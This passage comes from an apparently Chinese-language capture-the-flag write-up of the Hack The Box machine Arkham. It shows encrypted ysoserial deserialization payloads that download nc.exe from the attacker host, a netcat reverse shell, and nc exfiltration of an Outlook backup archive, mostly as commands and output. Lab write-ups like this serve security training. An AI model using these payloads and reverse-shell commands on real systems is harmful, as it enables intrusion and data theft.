2MdKuCGEIGysMjBwS3fvkWX6kL5w8G98g8evxDbfYkHzyF14jnr2kMvA1HZRyD2wcvsnF03HnathuuAfsXFi9nSS%2FwbSz1fz4k0TLI7Jwpbv6aAGFYU9IId4BaMaICpD4zmUdsKF%2FchdWUs7E65By387U2Ejeqn%2FY3UAanW9XVGnW1aWk9nG1iLSIviO15BJYS2423DKh2itxBdEkoL7a2k0YgPMLX%2BS%2F4%2FiJbEXqRSPgQijAFFrHv%2FFHK9kS3bd5CXSj%2BQrhHen7wNrMeCa7i0HvzRcKdoRRaP1oZYT1VfbBJziAiPBfDq5eCQVd%2BM9T%2B3b4cqJfnwxlMZZWJ2%2Be0AAzfzKy8YSINNgctHIi%2BcuihjrYHCAm9zC9g7UMCfdxFk3lDzU04FmSmF1FllmyJf9eg1oS6vjGDXN4Fxd8H5uRqvMsIcIlVGbJ0IBy9%2B2%2FcyEp1XvK8n5Gr%2BYtr%2BK9dNWLrWMDX2LxHe%2FhKqDzuhGbuUoHkHXZOCO5Iga5she%2FyXoaJTQ1sIBsVm7CWwc1ba594Do3xzsPUCPmunYgU7r%2FgISZZ1oDKNidaW9RTlZ%2Bjet7kQnD3KO6%2Bmc%3D                                                                      <br>                                                                                                                                                                                               <br>[*] Saved to : executenc.final     <br></code></pre></td></tr></table></figure><p>构造第一个请求将其填入burpsuit对应字段会看到http服务中目标10.10.10.130文件击中记录，404信息是不知道哪位同僚填错wget地址了一直往我这儿获取：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">10.10.10.234 - - [11/Apr/2022 16:22:58] <span class="hljs-string">&quot;GET /pwn.js HTTP/1.1&quot;</span> 404 -<br>10.10.10.234 - - [11/Apr/2022 16:25:03] code 404, message File not found<br>10.10.10.234 - - [11/Apr/2022 16:25:03] <span class="hljs-string">&quot;GET /pwn.js HTTP/1.1&quot;</span> 404 -<br>10.10.10.234 - - [11/Apr/2022 16:27:08] code 404, message File not found<br>10.10.10.234 - - [11/Apr/2022 16:27:08] <span class="hljs-string">&quot;GET /pwn.js HTTP/1.1&quot;</span> 404 -<br>10.10.10.130 - - [11/Apr/2022 16:27:55] <span class="hljs-string">&quot;GET /shell.exe HTTP/1.1&quot;</span> 200 -<br></code></pre></td></tr></table></figure><p>然后本地开启Metasploit监听，通过burp构造发送第二个请求，但是Metasploit监听的端口迟迟不回连：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf-pro exploit(multi/handler) &gt; run<br><br>[*] Started reverse TCP handler on 10.10.16.5:4444 <br><br><br></code></pre></td></tr></table></figure><p>好吧，换一种方式，我为其传入一个nc，然后通过nc建立一个反向shell链接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar CommonsCollections5 <span class="hljs-string">&#x27;cmd.exe /c powershell -c Invoke-WebRequest -Uri &quot;http://10.10.16.5/nc.exe&quot; -OutFile &quot;C:\windows\system32\spool\drivers\color\nc.exe&quot;&#x27;</span> &gt; uploadnc.payload<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar CommonsCollections5 <span class="hljs-string">&#x27;cmd.exe /c &quot;C:\windows\system32\spool\drivers\color\nc.exe&quot; -e cmd.exe 10.10.16.5 1337&#x27;</span> &gt; executenc.payload<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># ./JSF.payload.py uploadnc.payload uploadnc.final   </span><br>[+] Encrypting payload<br>  [!] Key : JsF9876-                                                                                                                                                                           <br>                                                                                                                                                                                               <br>[+] Creating HMAC signature                                                                                                                                                                    <br>[+] Appending signature to the encrypted payload                                                                                                                                               <br>                                                                                                                                                                                               <br>[*] Final payload : o4swGdxTZXw1mKtPxFkjUuWrKOBMVnhQ7RbMizpCb4xVYti30eaLecyiLLU7plNhjPFRnShy4IlIzxo0JHimBY3Uq1igjemgy0Ki4udfDHCBAJC2Yt%2BEq3hlEwGdEWrah3tqcdo5Gxzenm%2BTobetH0%2BaG8%2BiCEB1RbCm7b%2FRwuOINGcnD%2BFO3DfRKu9gMF%2Bhys2vYzpsGEyHK3knl7tEaywlBVCuHcXMqHLkcdxxT%2FxmSmtDFG85aQTVagEZSOEEX9bCEH73rYHKIdkiMmo3tRSv0aFcuTCzo9ywZEOE7bULbrBQyiDX34vkaoTgGwZx5xiJxcuYu0CBGPZRDq1UBGH1QEaZ391dmKFPiBhIqgml%2FErcnLpXhN2CNsbBu9HHKSuy0lTdaYJifqCf5zOXppnKQiTkInD9AN%2BIjrIKoKhLslblPlDOJTrY6IWKCYEH9ZL8tl0EWKQbiDEBanGkxqkFjjIIqXZFoV%2BTjkS1FnVO%2FoHWBB6y1rXJo3U1C5yWD2YmTWm4GDisEHwUAFbDTHvZSVfjA0tLKeDOxOM%2F8vhiJvs7XB%2FiL0xioZBCDhyyogM5ilMzKrxi25pKdV7qKFYgBIpi82HZJBiyt0w%2FfqlS6hjo07yHrHeKgVe5KiMmPRtt6h4buRWMlkPun2jgm259cO2loSVMSxjNu9%2FCCnMkGLK3TD9%2BqV2YP5mtCOlGyIG92TCIcaFw8tZsfH14qFQuvLXlje%2BWBoE1cgT2OzpqLZ5YnNLaBNtP8g%2FGkIl6LoObMsC3BpXUjNHX%2Fl6ZpFrpHPYqF04R1vdMLtxFTMVOrQbaoakmK3uiTmx6KyVVK59aLaXuOysuH%2BsV3gx3v3PoFcpnc1%2BAJTHWKqHfCy2li76ST4pm%2FNwg%2FTiZmJ7Y2965FPpV2Dw1mICArOvAOCf9fzZiZncI%2BCoX%2FOuaRilAYhWNKe8XzdQP6NjTNMEAoU8qpv%2FvNvILq22We0wQ1mUW3OrpauOZzU7%2BmQoL%2BGnNtOpmFx%2FzHz9CO1Qw3PfdQHYhQvw4tg%2FW90wu3EVMxVnQ5zD2tQV6GrCAJFCMnfi8x%2Bf6%2BnW9kb%2F3KJjeLP9EaVtnw4HgbxOvCM237bf506YkZewPgxQiLewUhIRMklMJnDnzAWGDt7FI7YRaUwB8JGXyetfsWfwktvElTU8G%2Fq7MLUp4%2BGPRDBvo6SMhFsfpnWDv02QaeNaSLMlE9boIJFbYlwyeLs9OWTCIP4cwrVmtcdeHaJalFuas%2BcLlmoyCpiYNGomoF2fGsKSBlO02H5aD7eIK4KEmO7jZE%2FsAoHMWWJfxo23t44S4ahSOeHfvlzJqhV2WT62diMizXDhDlWLlH5eRWvOufroUtk3jPS%2B%2F%2B6Ud4Bajai2yaRfDxHbTJgZ6IWsFXJmYIJXEh5ODaSShdwisWrLMFqobrL%2B3iOMkCTIPHpwTC4k4WjyVGoC3EmsS4trV68wenfb4asCPSZABGwnwfoqx6CHK%2BPGB13aRjo4KzHOVh7W5RxqOnjWWACJFXGhBny4XW4CootugK59aLaXuOyv6AM6KeF8cfH0GU8FiZ%2BF0wy6hHdRzv29OOgXpgJZaMjXVY9Qh34X7raWi1V1bOk3wI5mPW2oCG%2FHiPH0hgDaLJD%2F5rWumATBRhPfQdMukPUuvh7aBrYKhTjoF6YCWWjI11WPUId%2BF%2B62lotVdWzpNlg7XO%2BO71UXIulcb15uC4Uo%2FmVX%2BF55hhstnKpruvCRn1%2FE2U%2BSHSUwJwYQalMFkB3EYe3Bg0twUHB0FLdRlgk%2B1LfoOx%2BOAGABHbKLruPQnSgSaOr0QO7fs3ABDYpM%2B0brsRYoVq%2FxZrXHXh2iWpRbmrPnC5ZqMgqYmDRqJqBegTWtulqHIbfmX3cwmZtK73nCNfCh4bR8nU8ph%2B9dFQFQm3TB92LYOU%2Bo9ImRGT5ZxHsqO7r9vsYEY9lEOrVQEonBeV1772fxzAWY30P6lQjx7QKzqFpGw7VVu9x6xj4HqyzMw3srhBWpB1evb%2F2cj2VJfV2Ik%2Fe1XeDhxd98FCKdtuwD%2FhfhKKwyMHBLd%2B%2BTRSti5%2BPjgedH8VrYCDw%2Bh7TXbFuuzmic0Ejp%2FMdRQ2lgM7A1Zk2tN7LvOGYXm5vai2%2Fp9KNzcb82%2BWwUxFUNdG%2Fr%2B91Skv9JVChFgo1kBKZ5DSG9GVW0c93lwaDPZR8m2MdKuCGEIGysMjBwS3fvkWX6kL5w8G98g8evxDbfYkHzyF14jnr2kMvA1HZRyD2wcvsnF03HnathuuAfsXFi9nSS%2FwbSz1fz4k0TLI7Jwpbv6aAGFYU9IId4BaMaICpD4zmUdsKF%2FchdWUs7E65By387U2Ejeqn%2FY3UAanW9XVGnW1aWk9nG1iLSIviO15BJYS2423DKh2itxBdEkoL7a2k0YgPMLX%2BSOwVMSgs8u4SPgQijAFFrHWRvjlEtsVNbr09Qek%2F0QE3yWXS1W%2FgaT%2B7VnbdN2xAhE%2B9N5PSzJudEi8q%2Fo29VPYR09wsfhAuSvEv7LQi9Li3aeLisNAdJRLAFe2fINKZ5KfR5F6sKoAHQVGCs%2FFTXa2W5qUPs86loUUnMjCktO3ZeyWhFagPaspXry0dg9dzEqM%2BA286LIQXdlkG%2BLs59ls06cb795f%2FFPtS36DsfjgFTsXhaoJx%2BxyCKWo8mqMtvq9wKQlRYyfYAppcVMyzcxId4BaMaICpAKhETEr5dJl2cpK8KB00t3hvFxNTDnA1UcpVjNDtF6SRL9wjqd7GEyyvenTpPMn2lT8Yy%2BSOLmO%2B%2FqdeM3VEUmdh6slmRTw1cx%2B5106Li%2BXSeiYObQlpcKTK6xx8dBEixsFtN%2BbK1YXPXY5JjkmNKNAUNWmmj61OYkuI8bloGOq5J5xfs%3D                                                                                                                                                                       <br>                                                                                                                                                                                               <br>[*] Saved to : uploadnc.final  <br></code></pre></td></tr></table></figure><p>通过burp发送可以看到目标击中了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">10.10.10.234 - - [11/Apr/2022 16:48:00] code 404, message File not found<br>10.10.10.234 - - [11/Apr/2022 16:48:00] <span class="hljs-string">&quot;GET /pwn.js HTTP/1.1&quot;</span> 404 -<br>10.10.10.130 - - [11/Apr/2022 16:48:19] <span class="hljs-string">&quot;GET /nc.exe HTTP/1.1&quot;</span> 200 -<br></code></pre></td></tr></table></figure><p>再生成第二个：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># ./JSF.payload.py executenc.payload executenc.final   </span><br>[+] Encrypting payload<br>  [!] Key : JsF9876-                                                                                                                                                                           <br>                                                                                                                                                                                               <br>[+] Creating HMAC signature                                                                                                                                                                    <br>[+] Appending signature to the encrypted payload                                                                                                                                               <br>                                                                                                                                                                                               <br>[*] Final payload : o4swGdxTZXw1mKtPxFkjUuWrKOBMVnhQ7RbMizpCb4xVYti30eaLecyiLLU7plNhjPFRnShy4IlIzxo0JHimBY3Uq1igjemgy0Ki4udfDHCBAJC2Yt%2BEq3hlEwGdEWrah3tqcdo5Gxzenm%2BTobetH0%2BaG8%2BiCEB1RbCm7b%2FRwuOINGcnD%2BFO3DfRKu9gMF%2Bhys2vYzpsGEyHK3knl7tEaywlBVCuHcXMqHLkcdxxT%2FxmSmtDFG85aQTVagEZSOEEX9bCEH73rYHKIdkiMmo3tRSv0aFcuTCzo9ywZEOE7bULbrBQyiDX34vkaoTgGwZx5xiJxcuYu0CBGPZRDq1UBGH1QEaZ391dmKFPiBhIqgml%2FErcnLpXhN2CNsbBu9HHKSuy0lTdaYJifqCf5zOXppnKQiTkInD9AN%2BIjrIKoKhLslblPlDOJTrY6IWKCYEH9ZL8tl0EWKQbiDEBanGkxqkFjjIIqXZFoV%2BTjkS1FnVO%2FoHWBB6y1rXJo3U1C5yWD2YmTWm4GDisEHwUAFbDTHvZSVfjA0tLKeDOxOM%2F8vhiJvs7XB%2FiL0xioZBCDhyyogM5ilMzKrxi25pKdV7qKFYgBIpi82HZJBiyt0w%2FfqlS6hjo07yHrHeKgVe5KiMmPRtt6h4buRWMlkPun2jgm259cO2loSVMSxjNu9%2FCCnMkGLK3TD9%2BqV2YP5mtCOlGyIG92TCIcaFw8tZsfH14qFQuvLXlje%2BWBoE1cgT2OzpqLZ5YnNLaBNtP8g%2FGkIl6LoObMsC3BpXUjNHX%2Fl6ZpFrpHPYqF04R1vdMLtxFTMVOrQbaoakmK3uiTmx6KyVVK59aLaXuOysuH%2BsV3gx3v3PoFcpnc1%2BAJTHWKqHfCy2li76ST4pm%2FNwg%2FTiZmJ7Y2965FPpV2Dw1mICArOvAOCf9fzZiZncI%2BCoX%2FOuaRilAYhWNKe8XzdQP6NjTNMEAoU8qpv%2FvNvILq22We0wQ1mUW3OrpauOZzU7%2BmQoL%2BGnNtOpmFx%2FzHz9CO1Qw3PfdQHYhQvw4tg%2FW90wu3EVMxVnQ5zD2tQV6GrCAJFCMnfi8x%2Bf6%2BnW9kb%2F3KJjeLP9EaVtnw4HgbxOvCM237bf506YkZewPgxQiLewUhIRMklMJnDnzAWGDt7FI7YRaUwB8JGXyetfsWfwktvElTU8G%2Fq7MLUp4%2BGPRDBvo6SMhFsfpnWDv02QaeNaSLMlE9boIJFbYlwyeLs9OWTCIP4cwrVmtcdeHaJalFuas%2BcLlmoyCpiYNGomoF2fGsKSBlO02H5aD7eIK4KEmO7jZE%2FsAoHMWWJfxo23t44S4ahSOeHfvlzJqhV2WT62diMizXDhDlWLlH5eRWvOufroUtk3jPS%2B%2F%2B6Ud4Bajai2yaRfDxHbTJgZ6IWsFXJmYIJXEh5ODaSShdwisWrLMFqobrL%2B3iOMkCTIPHpwTC4k4WjyVGoC3EmsS4trV68wenfb4asCPSZABGwnwfoqx6CHK%2BPGB13aRjo4KzHOVh7W5RxqOnjWWACJFXGhBny4XW4CootugK59aLaXuOyv6AM6KeF8cfH0GU8FiZ%2BF0wy6hHdRzv29OOgXpgJZaMjXVY9Qh34X7raWi1V1bOk3wI5mPW2oCG%2FHiPH0hgDaLJD%2F5rWumATBRhPfQdMukPUuvh7aBrYKhTjoF6YCWWjI11WPUId%2BF%2B62lotVdWzpNlg7XO%2BO71UXIulcb15uC4Uo%2FmVX%2BF55hhstnKpruvCRn1%2FE2U%2BSHSUwJwYQalMFkB3EYe3Bg0twUHB0FLdRlgk%2B1LfoOx%2BOAGABHbKLruPQnSgSaOr0QO7fs3ABDYpM%2B0brsRYoVq%2FxZrXHXh2iWpRbmrPnC5ZqMgqYmDRqJqBegTWtulqHIbfmX3cwmZtK73nCNfCh4bR8nU8ph%2B9dFQFQm3TB92LYOU%2Bo9ImRGT5ZxHsqO7r9vsYEY9lEOrVQEonBeV1772fxzAWY30P6lQjx7QKzqFpGw7VVu9x6xj4HqyzMw3srhBWpB1evb%2F2cj2VJfV2Ik%2Fe1XeDhxd98FCKdtuwD%2FhfhKKwyMHBLd%2B%2BTRSti5%2BPjgedH8VrYCDw%2Bh7TXbFuuzmic0Ejp%2FMdRQ2lgM7A1Zk2tN7LvOGYXm5vai2%2Fp9KNzcb82%2BWwUxFUNdG%2Fr%2B91Skv9JVChFgo1kBKZ5DSG9GVW0c93lwaDPZR8m2MdKuCGEIGysMjBwS3fvkWX6kL5w8G98g8evxDbfYkHzyF14jnr2kMvA1HZRyD2wcvsnF03HnathuuAfsXFi9nSS%2FwbSz1fz4k0TLI7Jwpbv6aAGFYU9IId4BaMaICpD4zmUdsKF%2FchdWUs7E65By387U2Ejeqn%2FY3UAanW9XVGnW1aWk9nG1iLSIviO15BJYS2423DKh2itxBdEkoL7a2k0YgPMLX%2BRRDhatmfXD6yPgQijAFFrHv%2FFHK9kS3bd5CXSj%2BQrhHen7wNrMeCa7i0HvzRcKdoRRaP1oZYT1VagG4ZxblvAnvEIlw06ZZ5I0FbIXQZD0h%2F%2B2WzxBs7jKvT6qBYe5iPBT%2B3b4cqJfnwxlMZZWJ2%2Be0AAzfzKy8YSINNgctHIi%2BcuihjrYHCAm9zC9g7UMCfdxFk3lDzU04FmSmF1FllmyJf9eg1oS6vjGDXN4Fxd8H5uRqvMsIcIlVGbJ0IBy9%2B2%2FcyEp1XvK8n5Gr%2BYtr%2BK9dNWLrWMDX2LxHe%2FhKqDzuhGbuUoHkHXZOCO5Iga5she%2FyXoaJTQ1sIBsVm7CWwc1ba594Do3xzsPUCPmunYgU7r%2FgISZZ1oDHb9J6oiGjJTXLSHU4m6q8Ag354E%3D                                            <br>                                                                                                                                                                                               <br>[*] Saved to : executenc.final                                                                                     <br></code></pre></td></tr></table></figure><p>通过burp发送，可以看到shell回连：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># nc -lvnp 1337</span><br>listening on [any] 1337 ...<br>connect to [10.10.16.5] from (UNKNOWN) [10.10.10.130] 49687<br>Microsoft Windows [Version 10.0.17763.107]<br>(c) 2018 Microsoft Corporation. All rights reserved.<br><br>C:\tomcat\apache-tomcat-8.5.37\bin&gt;<span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>arkham\alfred<br><br>C:\tomcat\apache-tomcat-8.5.37\bin&gt;<br></code></pre></td></tr></table></figure><p>我想试着去反弹Meterpreter会话，奇怪的是我的载荷居然不见了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"> Directory of C:\Windows\System32\spool\drivers\color<br><br>04/11/2022  02:18 PM    &lt;DIR&gt;          .<br>04/11/2022  02:18 PM    &lt;DIR&gt;          ..<br>09/15/2018  12:42 PM             1,058 D50.camp<br>09/15/2018  12:42 PM             1,079 D65.camp<br>09/15/2018  12:42 PM               797 Graphics.gmmp<br>09/15/2018  12:42 PM               838 MediaSim.gmmp<br>04/11/2022  02:18 PM            38,616 nc.exe<br>09/15/2018  12:42 PM               786 Photo.gmmp<br>09/15/2018  12:42 PM               822 Proofing.gmmp<br>09/15/2018  12:42 PM           218,103 RSWOP.icm<br>09/15/2018  12:42 PM             3,144 sRGB Color Space Profile.icm<br>09/15/2018  12:42 PM            17,155 wscRGB.cdmp<br>09/15/2018  12:42 PM             1,578 wsRGB.cdmp<br>              11 File(s)        283,976 bytes<br>               2 Dir(s)   8,713,940,992 bytes free<br><br>C:\Windows\System32\spool\drivers\color&gt;<br></code></pre></td></tr></table></figure><p>我试着去再传一下，一方面我是想看看有什么机制删除了我的载荷，两方面万一能成功，我不想浪费太多的时间在windows提权上：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">PS C:\Windows\System32\spool\drivers\color&gt; wget http://10.10.16.5/shell.exe -o shell.exe<br>wget http://10.10.16.5/shell.exe -o shell.exe<br>PS C:\Windows\System32\spool\drivers\color&gt; <span class="hljs-built_in">dir</span><br><span class="hljs-built_in">dir</span><br><br><br>    Directory: C:\Windows\System32\spool\drivers\color<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>-a----        9/15/2018  12:42 PM           1058 D50.camp                                                              <br>-a----        9/15/2018  12:42 PM           1079 D65.camp                                                              <br>-a----        9/15/2018  12:42 PM            797 Graphics.gmmp                                                         <br>-a----        9/15/2018  12:42 PM            838 MediaSim.gmmp                                                         <br>-a----        4/11/2022   2:18 PM          38616 nc.exe                                                                <br>-a----        9/15/2018  12:42 PM            786 Photo.gmmp                                                            <br>-a----        9/15/2018  12:42 PM            822 Proofing.gmmp                                                         <br>-a----        9/15/2018  12:42 PM         218103 RSWOP.icm                                                             <br>-a----        4/11/2022   2:24 PM          73802 shell.exe                                                             <br>-a----        9/15/2018  12:42 PM           3144 sRGB Color Space Profile.icm                                          <br>-a----        9/15/2018  12:42 PM          17155 wscRGB.cdmp                                                           <br>-a----        9/15/2018  12:42 PM           1578 wsRGB.cdmp                                                            <br><br><br>PS C:\Windows\System32\spool\drivers\color&gt; <br></code></pre></td></tr></table></figure><p>好吧，执行不成功，而且执行一次我的载荷便会消失，看来作者并不想我这样做。我找到了User.txt:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Users\Alfred\Desktop&gt;<span class="hljs-built_in">dir</span><br><span class="hljs-built_in">dir</span><br> Volume <span class="hljs-keyword">in</span> drive C has no label.<br> Volume Serial Number is FA90-3873<br><br> Directory of C:\Users\Alfred\Desktop<br><br>02/03/2019  09:33 AM    &lt;DIR&gt;          .<br>02/03/2019  09:33 AM    &lt;DIR&gt;          ..<br>02/03/2019  09:33 AM                70 user.txt<br>               1 File(s)             70 bytes<br>               2 Dir(s)   8,712,253,440 bytes free<br><br>C:\Users\Alfred\Desktop&gt;<span class="hljs-built_in">type</span> user.txt<br><span class="hljs-built_in">type</span> user.txt<br></code></pre></td></tr></table></figure><h2 id="Root-txt"><a href="#Root-txt" class="headerlink" title="Root.txt"></a>Root.txt</h2><p>我在Alfred用户目录中发现了这个：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash"> Directory of C:\Users\Alfred\Downloads<br><br>02/03/2019  08:48 AM    &lt;DIR&gt;          .<br>02/03/2019  08:48 AM    &lt;DIR&gt;          ..<br>02/03/2019  08:41 AM    &lt;DIR&gt;          backups<br>               0 File(s)              0 bytes<br>               3 Dir(s)   8,712,843,264 bytes free<br><br>C:\Users\Alfred\Downloads&gt;<span class="hljs-built_in">cd</span> backups<br><span class="hljs-built_in">cd</span> backups<br><br>C:\Users\Alfred\Downloads\backups&gt;<span class="hljs-built_in">dir</span><br><span class="hljs-built_in">dir</span><br> Volume <span class="hljs-keyword">in</span> drive C has no label.<br> Volume Serial Number is FA90-3873<br><br> Directory of C:\Users\Alfred\Downloads\backups<br><br>02/03/2019  08:41 AM    &lt;DIR&gt;          .<br>02/03/2019  08:41 AM    &lt;DIR&gt;          ..<br>02/03/2019  08:41 AM           124,257 backup.zip<br>               1 File(s)        124,257 bytes<br>               2 Dir(s)   8,712,843,264 bytes free<br><br>C:\Users\Alfred\Downloads\backups&gt;<br></code></pre></td></tr></table></figure><p>我可以通过nc将其传送到我的机器中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvnp 1338 &gt; band.zip<br></code></pre></td></tr></table></figure><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\windows\system32\spool\drivers\color\nc.exe -w <span class="hljs-number">3</span> <span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.5</span> <span class="hljs-number">1338</span> &lt; <span class="hljs-name">C</span>:\Users\Alfred\Downloads\backups\backup.zip<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿Android)-[/home/worldisend/toolbox]<br>└─<span class="hljs-comment"># unzip band.zip                  </span><br>Archive:  band.zip<br>  inflating: alfred@arkham.local.ost  <br>                                                                                              <br>┌──(root㉿Android)-[/home/worldisend/toolbox]<br>└─<span class="hljs-comment"># ls</span><br> alfred@arkham.local.ost<br></code></pre></td></tr></table></figure><p> <a href="mailto:&#97;&#x6c;&#102;&#x72;&#x65;&#x64;&#x40;&#x61;&#x72;&#107;&#x68;&#x61;&#109;&#x2e;&#108;&#x6f;&#x63;&#97;&#108;&#x2e;&#111;&#115;&#116;">&#97;&#x6c;&#102;&#x72;&#x65;&#x64;&#x40;&#x61;&#x72;&#107;&#x68;&#x61;&#109;&#x2e;&#108;&#x6f;&#x63;&#97;&#108;&#x2e;&#111;&#115;&#116;</a>是一个 Outlook 电子邮件文件夹：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># file alfred@arkham.local.ost </span><br>alfred@arkham.local.ost: Microsoft Outlook email folder<br></code></pre></td></tr></table></figure><p>可以通过readpst转换：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># readpst alfred@arkham.local.ost</span><br>Opening PST file and indexes...<br>Processing Folder <span class="hljs-string">&quot;Deleted Items&quot;</span><br>Processing Folder <span class="hljs-string">&quot;Inbox&quot;</span><br>Processing Folder <span class="hljs-string">&quot;Outbox&quot;</span><br>Processing Folder <span class="hljs-string">&quot;Sent Items&quot;</span><br>Processing Folder <span class="hljs-string">&quot;Calendar&quot;</span><br>    <span class="hljs-string">&quot;Inbox&quot;</span> - 0 items <span class="hljs-keyword">done</span>, 7 items skipped.<br>Processing Folder <span class="hljs-string">&quot;Contacts&quot;</span><br>Processing Folder <span class="hljs-string">&quot;Conversation Action Settings&quot;</span><br>Processing Folder <span class="hljs-string">&quot;Drafts&quot;</span><br>    <span class="hljs-string">&quot;Calendar&quot;</span> - 0 items <span class="hljs-keyword">done</span>, 3 items skipped.<br>Processing Folder <span class="hljs-string">&quot;Journal&quot;</span><br>Processing Folder <span class="hljs-string">&quot;Junk E-Mail&quot;</span><br>Processing Folder <span class="hljs-string">&quot;Notes&quot;</span><br>Processing Folder <span class="hljs-string">&quot;Tasks&quot;</span><br>Processing Folder <span class="hljs-string">&quot;Sync Issues&quot;</span><br>Processing Folder <span class="hljs-string">&quot;RSS Feeds&quot;</span><br>Processing Folder <span class="hljs-string">&quot;Quick Step Settings&quot;</span><br>    <span class="hljs-string">&quot;alfred@arkham.local.ost&quot;</span> - 15 items <span class="hljs-keyword">done</span>, 0 items skipped.<br>Processing Folder <span class="hljs-string">&quot;Conflicts&quot;</span><br>Processing Folder <span class="hljs-string">&quot;Local Failures&quot;</span><br>Processing Folder <span class="hljs-string">&quot;Server Failures&quot;</span><br>    <span class="hljs-string">&quot;Sync Issues&quot;</span> - 3 items <span class="hljs-keyword">done</span>, 0 items skipped.<br>    <span class="hljs-string">&quot;Drafts&quot;</span> - 1 items <span 